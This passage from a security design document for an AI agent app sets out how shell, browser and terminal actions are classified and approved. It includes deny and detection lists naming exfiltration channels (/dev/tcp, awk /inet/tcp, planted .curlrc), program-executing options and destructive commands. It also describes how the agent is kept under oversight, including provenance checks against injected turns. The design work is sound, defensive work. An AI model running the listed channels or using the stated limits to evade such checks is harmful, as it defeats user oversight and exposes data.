  robocopy's `/s`, `/e`, `/mir` (also dash-prefixed, without bundles). A colon
  starts an option's value (`/exclude:C:/x.txt`, `/c:a/s`), which is not read
  as switches. Since a dynamic argument to these commands may carry a switch,
  and so may the verbatim text after `--%` (which expands `%VAR%` at run
  time), the may-traverse check keeps the forced ask for both.

  The host PowerShell block (`validatePowerShellAst`, including the Remove-Item
  recursive-and-forced check) and the permission decision both import it.
- **May** (`mayTraversePowerShellRecursively`): a fail-closed superset.
  Unknown, launcher and dynamic command names, archivers whose mode or operand
  is undecidable, unresolved Get-ChildItem operands and unparsed input count as
  walking. Only the permission decision
  uses it, and only on the MXC route, where it keeps the forced modal ask for
  the undecidable remainder. It is never a host-block rule.

Archivers are classified by mode, because listing or extracting an archive does
not walk an existing tree:

| Class | Forms | Result |
|---|---|---|
| Definite | tar create, append or update: `c`/`r`/`u` in a bundled first argument (`tar cf`) or a dash bundle (`-czf`), or `--create`/`--append`/`--update` and unique long-option prefixes of any length (`--cr`, `--ap`, `--up`), skipping the value word of an option that takes one (`--file -t -c`, `-f -t -c`); 7z, 7za or 7zr `a`/`u`; `zip -r` (also bundled, as in `-qr`, and `--recurse-paths`); Compress-Archive whose `-Path` (by prefix or position) is a wildcard, or whose `-Path`/`-LiteralPath` is directory-shaped (`.`, `..`, or a trailing separator) | denied on both layers |
| Not traversal | tar `-t`/`-x`, 7z `l`/`x`/`e`/`t`, unzip, Expand-Archive | not a traversal; extraction writes belong to the write policy |
| Undecidable | a tar long option that is ambiguous or unknown to the GNU option table, when no later static mode decides (Windows ships bsdtar, whose options differ; a word after such an option may be its value, so only a create mode then decides); every 7z command other than `a`/`u`/`l`/`x`/`e`/`t`; a mode that is not static: a dynamic first argument, bundled flags from a variable or splat, a dynamic 7z command, zip with a dynamic argument and no `-r`; Compress-Archive with a dynamic path, a path from the pipeline, or a literal non-wildcard path not shaped as a directory | not definite, so the host does not refuse it; `may`, so MXC keeps the forced ask |

A literal Compress-Archive path such as `src` may be a file or a directory.
The shared classifier reads no filesystem state, so both layers see the same
answer: undecidable, not denied.

Definite recursion is refused on every host route: MXC, ASRT, the pinned or
explicitly approved host shell, and the Windows plain child. The only exception
is the disposable container, whose grant relaxes `dynamic-path`. The reason is
that the host block is the final layer before spawn. The MXC link-traversal
measurement (T6) covered only non-recursive reads through links inside MXC. The
permission decision therefore denies definite recursion up front, at layer 0
with the host block's exact refusal text, wherever the selected route does not
relax `dynamic-path`. A user never sees an ask that execution then refuses.

Enabling recursive PowerShell on MXC later would need two things. First, a
container-layer measurement of the recursive forms through junctions and
directory links. Second, a deliberate change to the host block. The decision
follows the shared classifier and the route fact, so it needs no separate edit.

The route fact is one value. `executionPlanPathPolicyRelaxations(plan)` derives
the relaxations a grant for the selected plan would carry. The executor passes
that value for the plan it selected before authorization as
`shellExecution.pathPolicyRelaxations`; an absent value means none. Grant
issuance recomputes it from the final, possibly rebuilt plan. If it differs
from what the decision saw, issuance refuses with an internal-contract error,
so nothing runs under a decision made for another route. Consumption compares
the grant's relaxations with the same function and fails closed on a mismatch.
A rebuild from host to `analysis-required` keeps the empty set and is
unaffected.
Every route other than a disposable container (host, workspace sandbox,
approval-required) is also re-observed at the final handler boundary, so a
newly available disposable route cannot reuse that decision's empty relaxations.

The host-native broker route has a different boundary. The controller cannot
open the workload filesystem directly, and the workload is created without
host binds, devices, Compose secrets/configs, added Linux capabilities or
controller environment. The executor therefore does not canonicalize guest
paths against the host filesystem and does not run the host Bash structural
parser on a command that the broker executes inside the guest. Guest paths are
normalized with POSIX semantics against the capability-bound guest cwd or HOME.
Normal tool authorization, reviewer policy, audit, request bounds and deadlines
remain mandatory. PowerShell has no broker backend and fails closed.

The reviewer grades a routed invocation against the substrate its effects land
on. When the executor selects `disposable-container` for a shell **through the
workload broker**, or the brokered canonical route for a file tool, it records
that host-derived `DisposableSubstrate` on the invocation's permission context
(assigned on every invocation, so a value inherited on a caller's context never
survives onto a host-routed call), and
[sandbox-capability.ts](../../src/permissions/sandbox-capability.ts) resolves
the reviewer capability to `disposable-container` (verified; filesystem and
process confined, network not claimed) ahead of the host-shell plan, whose
`none` describes a plain child that call never spawns. The rule classifier
then grades guest-scoped effects as such. A read or write of any guest path
is LOW. A guest shell is graded first match wins:

1. **Destructive → MEDIUM** (risk evidence for the permission pipeline;
   critical deletion remains a forced floor). Matched on raw text and on tokens, so quoted command
   names, long options and `--` count; a dangerous long option matches when
   its spelling is a prefix of the dangerous name, the way GNU and git resolve
   abbreviations. This covers `rm`/`unlink`/`shred`/`truncate`/`dd`,
   `find -delete`, `git clean`, `git reset --hard`, `git checkout -- <path>`
   and `git checkout .`, `git restore` without `--staged`, `git stash
   drop`/`clear`, rsync `--del*`/`--remove-source-files`, tar
   `--remove-files`, git ref deletion and forced ref overwrite (`git branch
   -d`/`-D`/`--delete`/`-f`/`-M`/`-C`, `git tag -d`/`--delete`/`-f`, `git
   checkout -B`, `git switch -C`, `git fetch --prune`/`--prune-tags`/`--force`,
   a forced refspec with a destination on `git fetch`/`git pull`
   (`+main:main`; a bare `+main` only updates remote-tracking refs, which the
   default refspec already forces), `git remote remove`/`prune`, `git mv -f`),
   `git checkout <tree-ish> <path>…` (two or more operands; a single operand,
   `git checkout f.txt`, cannot be told from a branch switch on the line and
   stays LOW — a stated limit), abandoning an in-progress merge,
   rebase or pick (`--abort`, `--skip`, `--quit`), the deleting git forms
   that are not on the allowlist at all (`git gc`, `git prune`, `git reflog
   expire`/`delete`, `git worktree remove`/`prune`, `git notes
   remove`/`prune`, `git update-ref -d`, `git symbolic-ref -d`, `git push
   --delete`/`--force`/`:ref`/`+ref`), and inline interpreter code (`python -c`, `node -e`,
   `perl -e`, `ruby -e`, `php -r`, a program read from stdin or a `data:`
   URL), whose effects cannot be graded from the line. Only deletion and
   discard verbs are destructive: a content edit, including emptying a file
   through a redirect (`> f`), `cp /dev/null f` or an editor (`sed -i d f`),
   is a plain edit and is not graded as destructive in the guest. History
   rewrites the reflog can recover (`git reset` without `--hard`, `git commit
   --amend`, `git rebase`) stay LOW; `git branch -f`/`-D` are destructive
   because they can drop an unmerged ref the reflog of `HEAD` never held.
   Removing regenerable state stays LOW too: build outputs and packages
   (`cargo clean`, `mvn clean`, `npm prune`, `apt-get purge`/`autoremove`)
   and `rmdir`, which only removes an empty directory, are not user work.
2. **Not on the guest allowlist → MEDIUM**, because the guest does not
   confine network. A leaf's argv and supported command structure must be
   visible on the line, subject to the script and planted-file limits below:
   any `$` expansion or backtick, any `NAME=value`
   environment assignment (including through `env`), `xargs`, or a
   `/dev/tcp`/`/dev/udp` path makes it ineligible. An eligible leaf must then
   match its tool's argv spec exactly: every option an exact allowlisted
   spelling for that tool and subcommand (so an abbreviation or an unknown
   letter in a short cluster fails, and no option value may carry a URL or a
   remote `host:path` — a `:` before any `/` — since tar, rsync and cp-like
   tools open a connection for that form: `tar -cf host:/a.tar` stays MEDIUM,
   and so does the same value after `--force-local`, which is admitted only
   for local archives. Options whose value is text rather than a file — a
   commit message, a format, a pattern, a date — are declared per tool and keep
   only the URL check, so `git commit -m "fix: x"` stays LOW. Toolchain
   flags passed through to another tool are parsed into their own words: go
   `-ldflags` admits only `-s`, `-w`, `-X name=value`, `-buildid=`,
   `-linkmode=internal` and similar, and `-gcflags`/`-asmflags` only
   optimisation, diagnostic, define and include flags, so `-extld`,
   `-extldflags`, `-linkmode=external`, `-importcfg` or any unknown tool
   flag is not LOW; a cargo `--target` must be a triple-shaped name, never a
   `.json` target spec path that can name the linker (a name that is not
   built in resolves through rustc's target search, so a planted target file
   is the planted-file limit); `rustc -C`, `cargo rustc` and
   `RUSTFLAGS` are not allowlisted), and
   every positional the tool's predicate — a bare package spec for installs
   (no URL, VCS or `@`-URL form, no source, registry, index or config
   option; a local path only as an editable target, `-e .`, or a requirement
   or constraint file, `-r requirements.txt`), a local path word (path
   characters only, so never a command string or a `host:path`), a literal
   git clone/fetch source (including the scp form `git@host:repo.git`), or for
   `curl`/`wget` a plain public URL with exact GET-only options. Wrappers that
   run another program (`uv run`, `bundle exec`, `bun run`, `bun x`, `npx`,
   `pnpm exec`, `yarn dlx`, …) grade the wrapped argv as a command of its own.
   `bun run <name>` is graded this way by design: bun resolves the same word
   to a package script, a file or a binary, and the line cannot tell which, so
   a script name that is not itself an allowlisted command (`bun run build`)
   stays MEDIUM, unlike `npm run <script>`. A name that coincides with an
   allowlisted command (`bun run test`, `bun run tsc`) grades as that command
   and is LOW; the script it may run instead is the same stated limit as
   `npm run <script>` below.
   A tool whose first positional is a subcommand names the allowed words
   explicitly (`git submodule update|init|status|sync`, never `foreach`), and
   options that name a program to run (`sort --compress-program`, `split
   --filter`, `install --strip-program`, `rg --pre`, `fd --exec`, `ag
   --pager`) are refused even on verbs that are otherwise local. That
   program-option guard is the host's own: the host read-only classification
   (`host-risk-inspector.ts`) uses the same check, so on the host too a
   read-only verb handed a program (`sort --compress-program` and its
   abbreviations, `ag --pager`, `rg --pre`/`--hostname-bin`, `fd --exec`/`-x`)
   is an execution, not a read. The host also resolves GNU getopt
   abbreviations of write flags (`sed --in-pl`, `sort --out`), treats
   `GIT_CONFIG_PARAMETERS` as an execution-selecting environment variable, and
   does not read `git reflog expire`/`delete` as an inspection: they rewrite
   the reflog.
   Everything else — any shell binary, `exec`, `eval`, `builtin`,
   `source`/`.`, BusyBox, aliases, a pipe or here-doc into a shell, unknown
   verbs, a path-qualified program outside the system bin directories, input
   the tokenizer cannot parse — stays MEDIUM.
3. **Otherwise LOW.**

**This does not detect every way data can leave the guest.** These channels
are not inspected and rely on the guest's own egress policy:

- The literal URL path, hostname and DNS lookup of an allowed download or
  clone are themselves a channel; a plain public URL is not proof that
  nothing is carried.
- Script files run by an allowlisted interpreter (`python3 x.py`,
  `node x.js`), and build, test and package tools that run project or package
  code (`make` including `make --eval` and `make SHELL=`, `npm run <script>`,
  `pytest -p`, install and build scripts, git hooks), and programs run from
  a module reference (`go run <module>@latest`).
- awk's `/inet/tcp` special files.
- Files an earlier guest write planted: config files (`.curlrc`, `.wgetrc`,
  `pip.conf`, `.npmrc`, `.git/config`) and requirement or constraint files
  (`pip install -r requirements.txt` reads `--index-url` and URL lines from
  the file).
- `git ext::` transports in a clone source are refused here and are also
  blocked by git's default `protocol.ext.allow`.

A listening server such as `python -m http.server` is inbound only and is not
egress.

Network-category tools are graded by the network rules exactly as on the
host. The
operator-attested container never becomes a substrate: it is same-process, the
shell is a plain child of the controller sharing its `~/.ave`, pid namespace
and environment, so that route keeps the host-shell plan grading. Approval
requests for a broker-routed shell carry the guest capability rather than the
host plan of a child that never spawns. The verdict
cache keys by the guest identity, so a host verdict never serves a guest call
and vice versa. An unverified or partially confined guest earns no relaxation.

The Docker broker independently binds and revalidates the exact container cgroup's
`memory.events` for OOM evidence.

Execution location, configuration, authentication and OS identity are separate
properties. ASRT launches processes on the current host with a temporary HOME
and configuration profile for each invocation. It does not inherit the user's
terminal login state. Plain execution uses the host HOME and filtered child
environment. Both run as the current OS user; selecting host execution grants
no administrator privileges. The final host-owned execution plan determines
confinement; a temporary HOME alone is not an OS sandbox.

Bash and PowerShell accept `executionMode: "default" | "host"` and an optional
`justification`. Omission keeps the default route. An explicit host request
requires a nonblank justification and foreground execution. The host selects
the final plan after input hooks and before environment capture and path
analysis. Outside an operator-attested guest, host mode selects plain execution
without OS confinement. Following the reference hosts (Claude Code, Codex), a
user allow rule that matches the command approves it without a prompt;
otherwise it requires a fresh exact-action `allow-once`, including in allow mode
or when sandboxing was already disabled. Deny rules still deny, and the shell
floor (credential paths and the sink catalogue) and ask rules still force the
per-call modal over any allow rule. Sensitive-path, directory, command and
dynamic-syntax checks remain mandatory on that route.

Without a matching allow rule, only a response from the verified local desktop
renderer can authorize this explicit request. The approval displays the exact
command, cwd and justification and states that the command runs once as the
current user without the OS sandbox. Headless and remote-controller requests are
denied before approval or rule evaluation. Automatic, remembered, allow-mode,
plugin, platform and parent-agent decisions cannot authorize host mode. The
opaque permit is minted from one of two host-issued, action-bound proofs — the
signed approval receipt, or the PermissionManager's own layer-3 allow-rule
decision for the same command and resolved cwd — and is consumed once before
spawn. Changed commands, cwd, plans or request fields and replayed permits or
rule decisions fail closed.

An allow-rule proof is issued only for an explicit host execution plan. It
belongs to the issuing PermissionManager and its policy epoch, including the
project-rule revision. Rule, mode and relevant settings changes revoke
outstanding proofs and permits. The proof also captures the cwd's physical
realpath, device and inode during evaluation. Both proof consumption and the
permit check immediately before spawn require the same policy epoch and physical
directory. The checks also re-read hashes of the persisted user and relevant
project rule stores; another writer's change or a read error revokes authority
without requiring a cache reload. A changed identity or version rejects
execution with an error. Rejected authority requires normal authorization again.

Persisted policy mutations in this host and the final execution grant share a
serial queue: a queued deny is durable before validation can grant the waiting
child. Final validation and the grant run synchronously. Uncoordinated external
edits that land after final validation are honoured from the next command.

Permit-bearing shells spawn with the bound physical realpath. On macOS and
Linux, a host-authored prelude checks the child's physical cwd and device/inode
before the user command, then waits for the host's final policy grant on a
private pipe. The prelude reports guard failure through that pipe and closes it
before user code runs. The host maps guard failure to the revocation error;
ordinary command output and exit status, including 197, remain intact. Native
Windows shell routes use the physical spawn path but lack a child-side identity
check; directory rename/replacement after the host check remains a limitation
on that platform. Their final policy validation and native spawn share the same
serial queue.

A sandbox requested but unavailable carries `fallbackReason: "requested-sandbox-unavailable"` and `sandboxed: false` in its host execution plan. The card, model environment and tool result disclose the missing isolation. Explicit environment activation failures retain the startup refusal described above. When a plain host route is available, it uses the decision tree's host-shell mode/human path; ordinary approval may offer prefix rules. Protected floors and host credential-store admission denial remain authoritative. Plan issuance, approval and execution permits must describe the same exact route.

Inside a live operator-attested disposable one-shot, `executionMode: "host"`
means the strongest shell authority reachable by that process, which is still
the disposable guest. The router therefore selects `disposable-container` and
does not present or require an approval for an unconfined host it cannot reach.
If reacquisition fails or the capability changes before grant issuance, the
invocation fails closed instead of degrading to a plain host child.

Every plain-shell call requiring one-shot consent exposes its complete command
and resolved working directory before the decision. If sensitive-data masking
would change its arguments or working directory, the gate rejects the request
before parking it. Masking is retained; hidden command bytes cannot receive an
execution permit through a redacted display.

Host execution is not a credential broker. Programs may consult host
configuration, but the environment filter does not forward token variables or
the SSH agent, and authentication success is not guaranteed. Without OS
confinement, this feature cannot guarantee that arbitrary programs never read
credential files. The actual environment remains owned by
[safe-env.ts](../../src/tools/safe-env.ts) and the prepared invocation.
[shell-execution-environment.ts](../../src/shared/shell-execution-environment.ts)
provides shared descriptions for the system prompt and approval UI; the prompt
describes the default route, while the approval describes the final call's plan.

## Shared Browser Control And Effects

Browser sandboxing and context isolation apply in every control mode. Agent
origin consent and site capability consent are separate from that baseline and
from each other. Origin approval is not a complete browser network firewall.
The [architecture](architecture.md#browser-and-terminal-workspace) owns state,
tab lifetimes, and presentation; this section owns effect authorization.

### User-owned surface choices

The [decision tree's resolved browser and host-terminal contracts](permission-decision-tree.md#resolved-conflicts-with-existing-invariants-lead-decision-2026-10-30-from-inventory-review) govern user-owned browser tabs and the user's host terminal. Being a user-owned surface does not itself create a forced one-shot floor. The first eligible agent action offers one shared card:

- **Allow all this session** permits later eligible actions on that surface without another ordinary card.
- **Auto** checks only logical consistency: does this action follow from the user's request and current task step, and target the intended tab/page or command without unrequested extras? Failure, error, missing intent or uncertainty uses a normal approval card. This is not a general risk assessment and does not reuse the general risk cache.
- **Ask every time** explicitly confirms this action and continues asking later. This is the default when no choice exists. Dismissing the card does not execute the action.

The host stores choices only in memory, keyed independently by conversation session and surface (browser or host-terminal), and clears them at session teardown. A browser choice does not choose terminal behavior. Global execution mode, generic remembered grants and exact shell allows cannot bypass this surface decision. Headless actions on either surface always deny, regardless of choice, global mode or an allow rule.

Admission checks and deny rules remain authoritative. Genuine other-principal/taint, exfiltration and other forced floors bypass the selector and retain one-shot approval. Credential entry, payments and irreversible submission protections remain enforced for every choice. Selection comes only from the authenticated native owner's valid live answer, never tool arguments. Physical terminal typing is a user action outside this pipeline.

The host resolves the actual session actor and direct parent from trusted tool
context. Window discovery does not authorize another conversation's owned tab.
Owned-tab access allows the owner, the owner's direct parent, or a caller whose
direct parent is that owner. The relation spans one parent/child step in either
direction, never a grandchild, sibling, or unrelated session. A current lease
still belongs exclusively to its exact actor.
Agent mutation needs a valid scoped control lease and live `agent-active` mode.
Recognized human input or Stop persistently pauses mutation until explicit trusted-chrome
Resume. Page observation may continue under its ordinary policy. Resume changes
the control generation; an earlier approval must fail even if tab and origin
look unchanged. Effects recheck window, actor, lease, origin, document, target
reference, and control generation across asynchronous boundaries.

Mouse attribution is bounded dispatch/receipt correlation because native mouse
receipts expose no injected-versus-human bit. The host arms exact guest,
button, coordinates, click count, down/up phase, and order once per receipt;
unmatched or expired input revokes the sequence and pauses mutation. A matching
human click during the armed interval cannot be distinguished. This is not an
absolute human-input provenance guarantee. Marked wheel events authorize only
their expected derived scroll sequence; keyboard debugger-source checks remain.
Stop provides an explicit takeover path independent of mouse correlation.

Ordinary pointer/range drag requires observed native down and up. HTML5 text
drag does not substitute a generic release acknowledgement for a missing raw
receipt: it requires a browser-originated `dragIntercepted` event correlated to
the observed source press, exact current guest/document/lease, and validated
source/target references. Only the captured immutable bounded text payload is
used for enter/over/drop. Interception grants no file-upload authority.

The internal protocol surface is a fixed `Input.setInterceptDrags`,
`Input.cancelDragging`, and `Input.dispatchDragEvent` path, not a model-facing
dispatcher. Accepted browser payloads are limited to at most 16 items and 64 KiB
of UTF-8 text and metadata, using `text/plain`, `text/html`, or `text/uri-list`
items; files, file URLs, and absolute-host-path payloads are refused. Optional
metadata and operation masks are validated rather than copied as authority.
Source cancellation and confirmed interception disable precede destination
enter/over/drop. A failed pre-drop teardown sends no drop and detaches/quarantines
an uncertain debugger session. Cancellation after destination entry sends a
bounded cancellation to the original session; it never retargets another guest.
Once a drop is dispatched, a lost acknowledgement means its effect is unknown:
the error must warn against automatic repetition. Cleanup cannot make that
uncertainty a retry-safe failure or a proven success.

Before keyboard effects, host-owned focus must resolve the same visible active
embedded tab through its stored renderer ID and preserve the exact guest,
document, generation, and lease across awaits. Trusted renderer focus is only a
request; native guest focus and `focusedFrame === mainFrame` must be observed.
Popups require native selection plus native focus. Missing, stale, hidden, or
wrong-frame focus fails rather than sending input elsewhere.

Acquiring a lease keeps the already-approved control generation stable. A
page-input action can finish through navigation only after a confirmed final
input effect and a typed document transition; no following input reaches the
replacement document. A navigation request may follow document transitions only
while its original caller, tab, and lease remain valid. Generic aborts,
takeover, caller cancellation, lease loss, or destruction remain failures rather
than page-load success.

Typed hover, drag, native selection, targeted scroll, and upload retain the
same document/frame/recipient and sensitive-field guards as existing actions.
Unsupported or ambiguous controls fail explicitly. Native child-window discovery
does not grant the popup its opener's approval. Popups require their own current
origin approval and retain child-window isolation and owner-window checks.
Embedded stop/pause/Resume APIs accept renderer slot IDs; popup pause/Resume
APIs accept main-issued popup handles. The host validates kind and owning
window, with no alias between those target namespaces.

`browser_upload({tabId?, ref})` has no model- or renderer-supplied host path.
It always requires explicit allow-once, including on an agent-created tab, then
a trusted native file picker naming the destination. Composer attachment
approval does not grant a browser upload. Cancellation consumes or revokes that
upload lease and sends no files.

The host binds an upload lease to window, session, tab, origin, document,
element reference, and control generation. It validates file type, regular-file
identity, sensitive-path policy, count, and size; stages bounded private readonly
byte copies; and rechecks the destination after every await. Pathname checks
alone do not prove immutable bytes. Staging outlives the tool result and stays bound to the
selected input/document. Replacement, navigation, guest destruction, and shutdown
release that selection. Native validation must separately verify browser read
behavior across those boundaries; tool completion alone is not a release trigger.
A process-wide storage ceiling includes active staging. Cleanup removes only
the current process's verified owned staging. Unknown crash leftovers are
neither adopted nor automatically deleted. Tool output contains nonsecret names,
counts, sizes, and status, never host paths or a reusable upload capability.

Bookmarks, history, find, zoom, previews, download status, and site decisions
are trusted browser-chrome operations, not new agent data-export authority.
Camera, microphone, geolocation, and notification checks require the live
requesting origin, owned guest, and verified current main frame; iframe origins
and redirects do not inherit unrelated grants. Fullscreen capability remains
`false` until safe exit UI exists; a stored allow cannot override this capability
gate. Unknown permissions deny. Download Save consent and rate limits remain
in force.

## Commands Typed Into A Workspace Terminal

Each visible workspace or side-work-panel terminal has one native host shell.
A side-work-panel mount is labeled **My terminal (host) · No agent access**; a
workspace mount is labeled **My terminal (host) · Agent commands need your
approval** (see [Host command control](#host-command-control)). It uses real HOME,
the configured native interpreter/profile and a validated initial directory. zsh
and bash use a per-PTY temporary rc directory and nonce-authenticated hooks,
sourcing the actual startup files before hooks and restoring the original ZDOTDIR
for user startup files. pwsh launches with `-NoProfile -NoExit` and an owned
wrapper that dot-sources the user's profiles in PowerShell's own order before the
hooks. On Windows that wrapper's directory is a fresh child of the private Ave
home, created owner-only and inheritance-protected by the home's own protection
helper and verified on read-back before the nonce is written; a temporary
directory would inherit its parent's DACL. If the home is not private, pwsh
starts natively without integration. This never runs the disposable-HOME installer against real HOME. Unsupported
interpreters or integration failure preserve the normal user shell and report why
integration is unavailable; unverified current directory/exit state stays unknown.
Integration is not authority to type, read host output or claim native support.

The first owned startup step (zsh's temporary `.zshenv`, bash's rcfile, pwsh's wrapper) reads
the nonce into an unexported shell variable and deletes its file before any user
startup file runs, so a user rc or a loader it starts cannot read the file and
forge markers. Residual limit: user startup files run in the same shell and can
still read that variable, and system startup files read before the wrapper
(such as `/etc/zshenv`) run before the nonce exists. Same-user processes are not
an isolation boundary.

A system zshrc that runs `compinit` (Ubuntu's `/etc/zsh/zshrc` does) runs while
ZDOTDIR is the temporary directory, so its completion dump is written there and
rebuilt for every host terminal, which slows startup; the user's own
`.zcompdump` is neither read nor changed. Pointing the dump at the real HOME
would write there, so it is accepted as a startup-cost limit; the dump is
removed with the temporary directory when the terminal closes. A user who
calls `compinit` from their own `.zshrc` runs it with their real ZDOTDIR
restored.

For a bash login launch, the wrapper explicitly sources the system profile and
first readable user login profile before hooks using an interactive rc launch.
The shell's read-only `login_shell` flag remains false, and automatic logout-file
semantics are not emulated. This startup compatibility limit does not grant
agent access.

Tools, ambient context, observation snapshots and continuations cannot read host
startup, user commands or scrollback. The one agent path into a host shell is
[Host command control](#host-command-control): one surface-authorized command
from the terminal's own workspace pane chat, whose own output span returns to
that chat. Only an explicit user block-attachment action may share other host
content, as user-provided untrusted context. Side-work-panel host terminals have
no agent read/write authority. Focus alone never creates it. The [workspace guide](../guides/browser-terminal-workspace.md#terminal-lanes)
explains the visible host and inline isolated surfaces.

An ordinary conversation instead owns an **Agent (isolated)** persistent PTY,
with disposable HOME, authenticated integration and existing filesystem/process
confinement. A main-owned conversation registry controls its lifetime. Internal
`tabId`/lane/incarnation fields remain opaque confinement, block and egress
identities, never a workspace tab binding or model-supplied ownership grant.
The checks below govern isolated commands, not permission to write a host PTY.

Agent spawn resolves its initial write-jail directory through host-owned
authorized workspace projects, including user-approved external project roots.
The candidate and admitted roots use canonical segment-aligned containment;
paths resolving outside those roots and renderer-supplied authority are refused.
This admission check is separate from sandbox access enforcement and is not
by itself proof against subsequent path changes. The user HOME itself is
never a valid Agent jail anchor, even if it appears as an authorized project.
Host cwd validation remains separate from this Agent confinement gate.

`terminal_run` ([terminal-run.ts](../../src/tools/terminal-run.ts)) types one
command into the invoking conversation's isolated PTY and presses Enter. From a
workspace pane chat bound to a host terminal it targets that host shell instead,
under [Host command control](#host-command-control). It remains a builtin in the `shell` category and uses the same
policy classifier as `bash`; the isolated terminal ref is an execution identity, not a
separate permission category. The checks in this section apply to Agent:

- The command is the permission manager's bash rule subject, in the directory
  the target terminal's shell last reported. `Bash(...)` deny, ask and allow
  rules (user and project), the credential-exfiltration floor and the
  sensitive-path floor read it exactly as they read a `bash` command. The
  executor's shape-based shell checks (path containment and the structural
  validator) read its `command` argument with the terminal's directory as its
  working directory, as they read a `bash` call's `cwd`: a relative operand
  that resolves outside the allowed directories asks for the directory grant.
  Unlike a `bash` `cwd`, the terminal's own directory is not refused for being
  outside them — the user may have moved the shell anywhere its sandbox
  allows — so only the operands are judged.
- A remembered decision covers the exact command and canonical directory in
  the sealed internal terminal identity, `lane: "agent"`, `terminalSessionId`, and host containment
  identity, only for the app session (`terminal-command` scope). A restarted
  PTY is a new identity even when its internal terminal ID is unchanged. Each Agent
  jail is fixed when its shell spawns. A bare `terminal_run` allow
  pattern does not cover every command, because the tool keys policy on its
  command as `bash` does.
- The reviewer sees the isolated PTY's active containment. Execution
  requires filesystem and process confinement for that exact incarnation;
  an unavailable or changed capability fails closed. Its write paths, deny
  floors and initial egress allow-list are fixed at spawn. Egress approvals
  and revocations still apply through the live proxy and grant store.

Agent terminal egress starts with an empty domain allowlist. Plugin manifests
and model endpoint domains authorize worker traffic only; they do not grant
terminal access. Unknown destinations retain the existing attributed terminal egress approval
path, destination eligibility and allow-once/session-lifetime/persistent scope
restrictions. Internal terminal grant identity does not give a workspace host
tab authority over this conversation PTY. Allow once covers one connection;
tab and persistent grants retain their existing attribution and revocation
rules. A background descendant keeps its terminal's attributed proxy identity
and follows the same approval path. Conversation teardown releases the isolated terminal's pending
asks and terminal-lifetime grants. These approvals do not change the host shell.

The target is resolved once from the actual authorized invoking conversation,
never its parent or an active-tab fallback. Main supplies the initial cwd from
session context; model arguments cannot select another conversation's terminal,
a visible host tab or its cwd authority. The registry deduplicates concurrent
spawn and seals the internal terminal identity, incarnation and containment
before approval. Execute refuses a changed shell directory or replacement PTY.
A terminal-bound pane turn targets only its bound host terminal, under the host
rules below; when that terminal cannot take the command it refuses with the
reason and never falls through to an isolated shell or a different target.

`terminal_read` inventories and reads only the invoking conversation's existing
isolated PTY. Targeted reads and continuations retain exact internal identity,
incarnation and block checks and refuse every host ref or foreign conversation.
Renderer spawn/input/resize/block/kill operations accept only host refs; they
cannot control an isolated PTY through its internal identifier. Isolated output
reaches conversation UI only through authenticated observation, not raw PTY data.
Each command renders inline with command, cwd, status, known exit code and
collapsible bounded output, with an isolated badge/color band.

Pane unmount or host-tab close alone does not destroy the conversation PTY.
Conversation teardown, including existing descendant cleanup, releases its PTY,
egress identity, pending spawn and block registration without orphan creation.
If existing tab lifecycle ends a pane conversation, that teardown also ends its
PTY. Closing a host tab kills only its host shell. Shutdown/window cleanup
handles both registries. A wait timeout can return a still-running command;
cancelling a waiter is not process-cleanup proof.

Unavailable confinement refuses without host/foreign fallback while the host
shell remains usable. The current Windows isolated interactive backend cannot
attest this contract. Supported host-shell integration is a separate capability:
zsh, bash and pwsh (PowerShell 7) have it; Windows PowerShell, cmd, fish and nu
do not and receive no agent-typing claim. pwsh integration attests prompts,
directories and exits, but PSReadLine documents no bracketed paste, so its
prompts report `Paste=0` and agent typing refuses them (`no-bracketed-paste`).
On Windows the host shell is `COMSPEC`; pwsh integration applies when it names
`pwsh.exe`.

Existing one-shot shell tools retain their explicit approved host/outside-sandbox
execution route. Their inline badge reflects the actual execution mode: an
unconfined command shows host execution rather than claiming isolation. Every
persistent conversation PTY remains confined; approving a one-shot host command
does not permit typing into a user's host terminal.

### Host command control

A workspace pane chat bound to a host terminal (the pane binding, for that exact
conversation, never a parent or an active tab) may ask `terminal_run` to type
one command at a time under its [user-owned surface choice](#user-owned-surface-choices). Main owns the boundary
([host-terminal-control.ts](../../src/main/terminal/host-terminal-control.ts),
[terminal-run.ts](../../src/tools/terminal-run.ts)):

- **User turn.** Only the model query of a turn the user typed at the keyboard
  in that pane chat carries the host-terminal turn capability
  ([host-terminal-turn.ts](../../src/tools/host-terminal-turn.ts)): no remote
  controller, unattended authority, agent message, attachment or staged
  guidance behind it, and never a sub-agent (which runs with the capability
  masked). "Typed at the keyboard" is never read from the origin string:
  every turn defaults to a non-user origin, and main makes a turn the user's
  only by minting a single-use `VerifiedUserKeyboardIntent`
  ([chat-origin.ts](../../src/shared/chat-origin.ts)) from a send whose
  gesture token preload consumed, which `runTurn` spends; a `user-keyboard`
  origin without it fails the turn. Main sees preload's consumed-token
  report (`userActivation: true`), not the token. Chat send, guide,
  side-chat and pane-chat send, edit-resend, continue and retry each carry
  their click's token; a queued auto-send stays `queue-auto`. A
  checkpoint branch consumes its click's token as the request leaves; main
  holds the minted intent as a single-use grant bound to that branch's
  source and target sessions and to the loop's session epoch at the fork,
  so a slow fork or load cannot outlive the click. The loop moves that epoch
  on every change of its session identity, so the grant holds only while
  the one change since the fork is the load of the target. Any other swap
  (a new chat, closing the tile, another session, leaving and returning)
  moves the epoch past it. The auto-continue spends the grant. A second use,
  another session or a newer branch refuses it, and an unredeemed grant
  lapses ten minutes after the fork. A loop's `sessionId` and
  `sessionEpoch` are getters; `replaceSessionIdentity` is their only writer
  and moves both together, for a main loop and a sub-agent child alike.
  The compiler rejects any other assignment, and a test keeps the backing
  fields private to that method.
  The headless `ave exec` prompt is the owner's via its unattended
  authority and never gets the capability. The inventory of entry points and
  their classification is a test over the compiler's syntax tree
  ([turn-entry-classification.test.ts](../../src/engine/turn/__tests__/turn-entry-classification.test.ts)).
  It follows aliases and counts computed calls.
  A routine, plugin or app message, or any other turn, is refused
  before a card. The turn id is sealed into the approval; the authorization
  step also requires that same turn, still speaking for the user. Both turn
  facts below are irreversible and are set by the conversation history's one
  write (`ConversationHistory.commit`), for each row it has not held before,
  so no producer can skip them. A user row appended mid-turn that the user
  did not type in the composer (staged app or plugin guidance, an agent
  message, a sub-agent's report, stop-hook feedback, or any future producer
  that does not declare keyboard provenance) records that another principal
  spoke: from then on every host command in the turn is refused with no card,
  even when a later file read changes the tool trust origin. A tool result
  (a file, a page, a plugin's, a browser's or a sub-agent's text, a command's
  output, an invalid-argument error, a refusal, or a tool search or plugin
  request), or any new row a host transform brings in (a compaction summary,
  wire or disk input restored mid-turn), records external content. A held row
  id proves nothing: a row under it is compared, by a digest of its role,
